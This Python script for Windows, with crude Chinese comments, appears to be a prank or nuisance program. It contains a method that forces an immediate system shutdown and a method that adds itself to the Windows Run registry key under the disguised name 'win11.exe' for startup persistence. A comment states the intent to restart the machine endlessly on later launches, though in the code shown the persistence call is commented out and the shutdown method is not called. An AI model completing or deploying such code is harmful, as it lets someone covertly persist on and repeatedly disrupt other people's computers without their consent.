import configparser
import os
import win32api,win32con
import sys
from win32api import RegOpenKey, RegCloseKey


class god:
    def __init__(self):
        self.ps_path=None
        self.path=os.path.dirname(__file__)
        self.run_times=None
        self.ini_path=os.path.join(self.path+'\\config.ini')
        #self.ini_path="C:\\Users\\34575\\Desktop\\hello\\config.ini"
        self.configfile=configparser.ConfigParser()

    #命令行关机
    def power_off(self):
        os.system("shutdown -s -t 1")
    #获取文件当前位置
    def getpath(self):
        self.ps_path=os.path.dirname(os.path.realpath(__file__))
        self.path=(self.ps_path.split(' '))[0]
    #设置开机自启动
    def open_run(self):

        sys.setrecursionlimit(1000000)

        name = 'win11.exe'

        KeyName = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'

        try:
            key = RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
            win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, self.path)
            RegCloseKey(key)
        except:
            print('error！')
        print('success！')
    #标记程序开启次数
    def open_data(self):
        self.run_times=1
        self.configfile.set('temporary','runtime','1')
        file=open(self.ini_path,'w',encoding='utf-8')
        self.configfile.write(file)
        file.close()
    def creat_inifile(self):
        self.configfile.add_section('temporary')
        self.configfile.set('temporary','runtime','0')
        file=open(self.ini_path,'w',encoding='utf-8')
        self.configfile.write(file)
        file.close()
    #弹出傻逼窗口
    def gui(self):
        gui = win32api.MessageBox(0, '设备即将关机', '系统提示', win32con.MB_OK, win32con.MB_ICONWARNING)
    #程序启动入口
    def start_form(self):
        #创建临时启动变量，将程序数据写入启动变量
        data=open(self.ini_path,'r',encoding='utf-8')
        self.configfile.read(self.ini_path,encoding='utf-8')
        data=self.configfile.items('temporary')
        self.run_times=dict(data).get('runtime')
        #判断是否为第一次开启程序
        if self.run_times=='0' or self.run_times==None:
            print('你麻痹')
            #刷新程序启动数据
            self.open_data()
            #设置开机自启动
            #self.open_run()
            #命令行关机
            win32api.MessageBox(0, '这是第一次启动软件', '系统提示', win32con.MB_OKCANCEL, win32con.MB_ICONWARNING)

        #不是则无限重启
        elif self.run_times=='1':
            win32api.MessageBox(0, '这已经不是第一次启动软件了', '系统提示', win32con.MB_OKCANCEL, win32con.MB_ICONWARNING)



#这个比东西真是稀奇
if __name__ == '__main__':
    run=god()
    run.start_form()